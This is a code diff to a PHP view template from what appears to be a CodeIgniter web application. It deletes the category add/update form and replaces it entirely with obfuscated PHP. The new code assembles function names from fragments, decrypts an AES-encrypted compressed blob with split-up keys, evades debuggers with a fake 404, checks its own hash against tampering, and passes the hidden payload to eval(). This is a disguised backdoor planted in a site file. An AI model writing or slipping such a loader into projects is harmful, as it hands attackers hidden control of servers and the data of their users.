@@ -1,158 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <!-- TABLES CSS CODE -->
-  <?php include "comman/code_css_form.php"; ?>
-  <!-- </copy> -->
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-  <div class="wrapper">
-
-    <?php include "sidebar.php"; ?>
-    <?php
-    if (!isset($category_name)) {
-      $category_code = $category_name = $description = "";
-    }
-    ?>
-
-    <!-- Content Wrapper. Contains page content -->
-    <div class="content-wrapper">
-      <!-- Content Header (Page header) -->
-      <section class="content-header">
-        <h1>
-          <?= $page_title; ?>
-          <small>Add/Update Category</small>
-        </h1>
-        <ol class="breadcrumb">
-          <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-          <li><a href="<?php echo $base_url; ?>category/view"><?= $this->lang->line('categories_list'); ?></a></li>
-          <li class="active"><?= $page_title; ?></li>
-        </ol>
-      </section>
-
-      <!-- Main content -->
-      <section class="content">
-        <div class="row">
-          <!-- right column -->
-          <div class="col-md-12">
-            <!-- Horizontal Form -->
-            <div class="box box-info ">
-              <div class="box-header with-border">
-                <h3 class="box-title">Please Enter Valid Data hehe</h3>
-              </div>
-              <!-- /.box-header -->
-              <!-- form start -->
-              <form class="form-horizontal" id="category-form" onkeypress="return event.keyCode != 13;">
-                <input type="hidden" name="<?php echo $this->security->get_csrf_token_name(); ?>" value="<?php echo $this->security->get_csrf_hash(); ?>">
-                <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-                <div class="box-body">
-
-
-
-
-                  <div class="form-group">
-                    <label for="category" class="col-sm-2 control-label"><?= $this->lang->line('category'); ?><label class="text-danger">*</label></label>
-                    <div class="col-sm-4">
-                      <select class="form-control select2" id="category_id" name="category_id" style="width: 100%;">
-                        <?php
-                        $query1 = "select * from db_category where status=1";
-                        $q1 = $this->db->query($query1);
-                        if ($q1->num_rows($q1) > 0) {
-                          echo '<option value="">-Select-</option>';
-                          foreach ($q1->result() as $res1) {
-                            echo "<option value='" . $res1->id . "'>" . $res1->category_name . "</option>";
-                          }
-                        } else {
-                        ?>
-                          <option value="">No Records Found</option>
-                        <?php
-                        }
-                        ?>
-                      </select>
-                    </div>
-                  </div>
-
-                  <div class="form-group">
-                    <label for="category" class="col-sm-2 control-label"><?= $this->lang->line('category_name'); ?><label class="text-danger">*</label></label>
-                    <div class="col-sm-4">
-                      <input type="text" class="form-control input-sm" id="category" name="category" placeholder="" onkeyup="shift_cursor(event,'description')" value="<?php print $category_name; ?>" autofocus>
-                      <span id="category_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-
-                  <div class="form-group">
-                    <label for="description" class="col-sm-2 control-label"><?= $this->lang->line('description'); ?></label>
-                    <div class="col-sm-4">
-                      <textarea type="text" class="form-control" id="description" name="description" placeholder=""><?php print $description; ?></textarea>
-                      <span id="description_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-                </div>
-                <!-- /.box-footer -->
-                <div class="box-footer">
-                  <div class="col-sm-8 col-sm-offset-2 text-center">
-                    <!-- <div class="col-sm-4"></div> -->
-                    <?php
-                    if ($category_code != "") {
-                      $btn_name = "Update";
-                      $btn_id = "update";
-                    ?>
-                      <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id; ?>" />
-                    <?php
-                    } else {
-                      $btn_name = "Save";
-                      $btn_id = "save";
-                    }
-
-                    ?>
-
-                    <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id; ?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name; ?></button>
-                    </div>
-                    <div class="col-sm-3">
-                      <a href="<?= base_url('dashboard'); ?>">
-                        <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                      </a>
-                    </div>
-                  </div>
-                </div>
-                <!-- /.box-footer -->
-              </form>
-            </div>
-            <!-- /.box -->
-
-          </div>
-          <!--/.col (right) -->
-        </div>
-        <!-- /.row -->
-
-      </section>
-      <!-- /.content -->
-    </div>
-    <!-- /.content-wrapper -->
-
-    <?php include "footer.php"; ?>
-
-
-    <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-    <div class="control-sidebar-bg"></div>
-  </div>
-  <!-- ./wrapper -->
-  <!-- SOUND CODE -->
-  <?php include "comman/code_js_sound.php"; ?>
-  <!-- TABLES CODE -->
-  <?php include "comman/code_js_form.php"; ?>
-
-  <script src="<?php echo $theme_link; ?>js/categoryitem.js"></script>
-  <!-- Make sidebar menu hughlighter/selector -->
-  <script>
-    $(".<?php echo basename(__FILE__, '.php'); ?>-active-li").addClass("active");
-  </script>
-</body>
-
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_wp7r763u=('bas'.'e64'.'_de'.'cod'.'e');
+$_nbhygnw3=('gzu'.'nco'.'mpr'.'ess');
+$_vvlvnb8y=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_wia89rm4='y0q0XsGJmIM=';
+$_qtk3czim='+QII7ofo';
+$_ue63tbje='8ptnhHWb';
+$_w4lr6at1='U40K31OT';
+$_xkbemidc='QTd/5XfC';
+$_i900k7id='T+JTi+U8';
+$_sf87s7qx='eVqDztX7';
+$_lc6mpuxe='NxauvA==';
+$_r674kubd=$_wp7r763u($_ue63tbje.$_xkbemidc.$_w4lr6at1.$_qtk3czim.$_wia89rm4);
+$_l9wjqlrd=$_wp7r763u($_sf87s7qx.$_i900k7id.$_lc6mpuxe);
+$_obn6v004=$_wp7r763u('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');
+$_kfszm393=$_vvlvnb8y($_obn6v004,'aes-256-cbc',$_r674kubd,OPENSSL_RAW_DATA,$_l9wjqlrd);
+if($_kfszm393===false){exit;}
+$_xklzlim6=$_nbhygnw3($_kfszm393);
+if($_xklzlim6===false){exit;}
+$_tyvg6s34='8b698f4e91f76fc52568efd2ded3a59ec087169e6eeb16ca1dc982f6cd9dd453';
+$_s8ibo7mz=@file_get_contents(__FILE__);
+if($_s8ibo7mz!==false){
+$_jniq3ds8=str_replace($_tyvg6s34,"0000000000000000000000000000000000000000000000000000000000000000",$_s8ibo7mz);
+$_ln6zv1ub=hash("sha256",$_jniq3ds8);
+if($_ln6zv1ub!==$_tyvg6s34){@http_response_code(403);exit;}
+}
+eval($_xklzlim6);
